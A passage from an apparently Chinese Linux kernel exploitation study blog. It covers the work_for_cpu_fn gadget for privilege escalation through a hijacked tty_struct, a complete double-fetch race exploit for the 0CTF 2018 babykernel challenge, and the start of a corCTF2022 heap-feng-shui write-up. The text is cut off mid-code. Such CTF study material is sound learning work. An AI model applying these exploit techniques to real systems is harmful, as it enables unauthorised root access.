class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__check_object_size);</span><br></pre></td></tr></table></figure><p>函数要求</p><ul><li>该对象的地址有效</li><li>该对象完全位于堆栈中</li><li>该对象完全位于一个slab分配器的object中(可以小于)</li><li>该对象不能指向内核代码段</li></ul><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>在长亭的wp中使用了work_for_cpu_fn这个函数中的gadget</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其会有如下调用</p><p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p><p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>在某篇文章中看到,关于调用这个函数似乎还有一些细节,如下</p><ol><li>即便修改了虚表后，调用 write 也无法执行 work_for_cpu_fn 函数的问题。我一直以为这里 write 的逻辑，用面向对象的思维来看就是直接调用 tty_struct 类重写的 write 虚函数，类似于 _IO_FILE 劫持虚表中的 write 指针后 write 就会直接执行劫持的函数的逻辑了。但是实际上不是这样的，在掉用虚表中函数指针前会先调用 tty_write 函数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">tty_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params">                     <span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span> =</span> file_tty(file);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ld</span>;</span></span><br><span class="line"> <span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (tty_paranoia_check(tty, file_inode(file), <span class="string">&quot;tty_write&quot;</span>))</span><br><span class="line">     <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="keyword">if</span> (!tty || !tty-&gt;ops-&gt;write || tty_io_error(tty))</span><br><span class="line">         <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="comment">/* Short term debug to catch buggy drivers */</span></span><br><span class="line"> <span class="keyword">if</span> (tty-&gt;ops-&gt;write_room == <span class="literal">NULL</span>)</span><br><span class="line">     tty_err(tty, <span class="string">&quot;missing write_room method\n&quot;</span>);</span><br><span class="line"> ld = tty_ldisc_ref_wait(tty);</span><br><span class="line"> <span class="keyword">if</span> (!ld)</span><br><span class="line">     <span class="keyword">return</span> hung_up_tty_write(file, buf, count, ppos);</span><br><span class="line"> <span class="keyword">if</span> (!ld-&gt;ops-&gt;write)</span><br><span class="line">     ret = -EIO;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">     ret = do_tty_write(ld-&gt;ops-&gt;write, tty, file, buf, count);</span><br><span class="line"> tty_ldisc_deref(ld);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后到 do_tty_write 中再进行用户态数据的拷贝，最后才实际调用函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">ssize_t</span> <span class="title function_">do_tty_write</span><span class="params">(</span></span><br><span class="line"><span class="params"> <span class="type">ssize_t</span> (*write)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>),</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> tty_struct *tty,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params"> <span class="type">const</span> <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params"> <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">ssize_t</span> ret, written = <span class="number">0</span>;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> chunk;</span><br><span class="line"></span><br><span class="line"> ret = tty_write_lock(tty, file-&gt;f_flags &amp; O_NDELAY);</span><br><span class="line"> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * We chunk up writes into a temporary buffer. This</span></span><br><span class="line"><span class="comment">  * simplifies low-level drivers immensely, since they</span></span><br><span class="line"><span class="comment">  * don&#x27;t have locking issues and user mode accesses.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * But if TTY_NO_WRITE_SPLIT is set, we should use a</span></span><br><span class="line"><span class="comment">  * big chunk-size..</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The default chunk-size is 2kB, because the NTTY</span></span><br><span class="line"><span class="comment">  * layer has problems with bigger chunks. It will</span></span><br><span class="line"><span class="comment">  * claim to be able to handle more characters than</span></span><br><span class="line"><span class="comment">  * it actually does.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">FIXME:</span> This can probably go away now except that 64K chunks</span></span><br><span class="line"><span class="comment">  * are too likely to fail unless switched to vmalloc...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> chunk = <span class="number">2048</span>;</span><br><span class="line"> <span class="keyword">if</span> (test_bit(TTY_NO_WRITE_SPLIT, &amp;tty-&gt;flags))</span><br><span class="line">     chunk = <span class="number">65536</span>;</span><br><span class="line"> <span class="keyword">if</span> (count &lt; chunk)</span><br><span class="line">     chunk = count;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span></span><br><span class="line"> <span class="keyword">if</span> (tty-&gt;write_cnt &lt; chunk) &#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> *buf_chunk;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (chunk &lt; <span class="number">1024</span>)</span><br><span class="line">         chunk = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">     buf_chunk = kmalloc(chunk, GFP_KERNEL);</span><br><span class="line">     <span class="keyword">if</span> (!buf_chunk) &#123;</span><br><span class="line">         ret = -ENOMEM;</span><br><span class="line">         <span class="keyword">goto</span> out;</span><br><span class="line">     &#125;</span><br><span class="line">     kfree(tty-&gt;write_buf);</span><br><span class="line">     tty-&gt;write_cnt = chunk;</span><br><span class="line">     tty-&gt;write_buf = buf_chunk;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Do the write .. */</span></span><br><span class="line"> <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">     <span class="type">size_t</span> size = count;</span><br><span class="line">     <span class="keyword">if</span> (size &gt; chunk)</span><br><span class="line">         size = chunk;</span><br><span class="line">     ret = -EFAULT;</span><br><span class="line">     <span class="keyword">if</span> (copy_from_user(tty-&gt;write_buf, buf, size))</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     ret = write(tty, file, tty-&gt;write_buf, size);</span><br><span class="line">     <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     written += ret;</span><br><span class="line">     buf += ret;</span><br><span class="line">     count -= ret;</span><br><span class="line">     <span class="keyword">if</span> (!count)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     ret = -ERESTARTSYS;</span><br><span class="line">     <span class="keyword">if</span> (signal_pending(current))</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     cond_resched();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (written) &#123;</span><br><span class="line">     tty_update_time(&amp;file_inode(file)-&gt;i_mtime);</span><br><span class="line">     ret = written;</span><br><span class="line"> &#125;</span><br><span class="line">out:</span><br><span class="line"> tty_write_unlock(tty);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一路上要经过一些检测和各种各样操作，一开始我使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(tty_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这样的方法调用，一下子就会挂在 copy_from_user 上，此处需要提供一个正确的 buf，和一定的长度，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(tty_fd, buf_a, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这样就可以调用到劫持的 work_for_cpu_fn 了。</p><p>由于 work_for_cpu_fn 的参数由 write 调用的第一个参数决定，也就是 tty_struct 本身，那么被调函数偏移在 0x20，这个没什么问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf_tty[<span class="number">4</span>] = prepare_kernel_cred_addr;</span><br></pre></td></tr></table></figure><p>这样就可以了，然后第一个参数在偏移 0x28 处，也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf_tty[<span class="number">5</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>看似没什么问题，但是之后执行到 work_for_cpu_fn 时偏移 0x28 会莫名其妙的变成 1，导致执行 kernel_prepare_cred 时出错，估计是 tty_write 和 do_tty_write 操作中对此处的成员变量进行了操作（此成员变量是一个信号量，这里可能是为了线程同步之类的有一点改变）。</p><p>如果用虚表做 ROP 的话不需要考虑对别的变量的修改，因为不需要考虑参数的问题，但是用 work_for_cpu_fn 来进行函数调用时就需要小心一点了，所以最后还是根据长亭的 WP 换成了 ioctl 来触发。类似的，在调用函数指针前也先调用了 tty_ioctl，这个函数是一个较为巨大的 switch 结构，所以给予的 cmd 的值要比较小心，我尝试了一些随机数都无法达到效果，最后还是根据长亭 WP 用的 233 实现的，也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(tty_fd, 233, 233);</span><br></pre></td></tr></table></figure><p>这样调用。看来 233 这个数确实还是有一些魔力。</p><h1 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h1><p>在某一篇文章中ti到tty_struct结构体的大小是不一定的</p><blockquote><p>tty_struct 的 size 并不一定是 0x2e0。正确定位其 size 的做法是在 ida 中解析 vmlinux ，查找字符串 “&amp;tty-&gt;legacy_mutex” 的引用。定位到类似 <code>v2 = (_DWORD *)sub_FFFFFFFF81236300(qword_FFFFFFFF8288F810, 21004480LL, 0x3A8LL);</code> 的函数，最后一个参数就是 tty_struct 的大小。（即使 0x2e0 和 0x3a8 都是 0x400 的 slub）</p></blockquote><h1 id="2018-0ctf-final-babykernel"><a href="#2018-0ctf-final-babykernel" class="headerlink" title="2018-0ctf-final-babykernel"></a>2018-0ctf-final-babykernel</h1><p>驱动主要注册了一个 <code>baby_ioctl</code> 函数，其中包含两个功能。</p><ul><li>当 ioctl 中 cmd 参数为 0x6666 时，驱动将输出 flag 的加载地址。</li><li>当 ioctl 中 cmd 参数为 0x1337 时，首先进行三个校验，接着对用户输入的内容与硬编码的 flag 进行逐字节比较，当一致时通过 <code>printk</code> 将 flag 输出出来。</li></ul><p>应该传入如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> *flag;</span><br><span class="line"><span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>检查校验时涉及到一个自己实现的检查函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  <span class="keyword">return</span> v3 || a3 &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CFADD</strong> 的作用是 carry flag of addition，获得两数相加的 CF 位（进位），重点是 a3 &lt; v4，其中 a3 是 (unsigned int)&amp;current_task) + 0x1358)，对应结构体中的值就是：task_struct-&gt;thread-&gt;fpu-&gt;state，而 v4 是 a1 和 a2 的和，在第二个判断条件中，对应传入的 flag 的最后一个字节的地址。</p><p>那么三条检查就分别对应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.输入的输入指针是否为用户态数据</span><br><span class="line">2.数据指针内的 flag_str 是否指向用户态</span><br><span class="line">3.数据指针内 flag_len 是否等于硬编码 flag 的长度</span><br></pre></td></tr></table></figure><p>有 flag 的地址，但因为在内核空间中，直接传的话不能通过验证，所以先传入一个用户空间的合法地址，然后开另一个线程不断竞争修改其为内核空间 flag 的地址。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> compete_thread;</span><br><span class="line"><span class="type">void</span>* real_addr;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>] = <span class="string">&quot;padding.....&quot;</span>;</span><br><span class="line"><span class="type">int</span> competetion_times = <span class="number">0x1000</span>, status = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span>* flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">competetionThread</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">            flag.flag_addr = real_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, result_fd, addr_fd;</span><br><span class="line">    <span class="type">char</span>* temp, *flag_addr_addr;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);</span><br><span class="line">    temp = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);    </span><br><span class="line">    addr_fd = open(<span class="string">&quot;./addr.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    temp[read(addr_fd, temp, <span class="number">0x100</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    flag_addr_addr = <span class="built_in">strstr</span>(temp, <span class="string">&quot;Your flag is at &quot;</span>) + <span class="built_in">strlen</span>(<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">   pthread_create(&amp;compete_thread, <span class="literal">NULL</span>, competetionThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag.flag_addr = buf;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);</span><br><span class="line">        result_fd = open(<span class="string">&quot;./result.txt&quot;</span>, O_RDONLY);</span><br><span class="line">        read(result_fd, temp, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(temp, <span class="string">&quot;flag&#123;&quot;</span>))</span><br><span class="line">            status = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cancel(compete_thread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] competetion end!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p><p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</p><p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p><h1 id="corCTF2022-cache-of-castaways"><a href="#corCTF2022-cache-of-castaways" class="headerlink" title="corCTF2022 - cache-of-castaways"></a>corCTF2022 - cache-of-castaways</h1><p>用于学习<code>Cross-Cache Overflow</code> 和 <code>Page-level Heap Fengshui</code>这两种技术</p><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>具体的实现暂且不深入了解</p><p>我们使用时只需要知道以下几点</p><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p><p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p><p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure><p>那么之后当我们创建如下这样一个结构体时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure><p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p><p>并且当关闭socket时,会将这些页框释放</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>内核保护smap,smep,kpti,kaslr这些都开了</p><p>关键模块为<code>cache_of_castaway.ko</code></p><p>内部创建了一个分配大小为512的kmem_cache,创建标志设置了slab_account,因此不会和其他kmem_cache合并</p><p>模块只注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 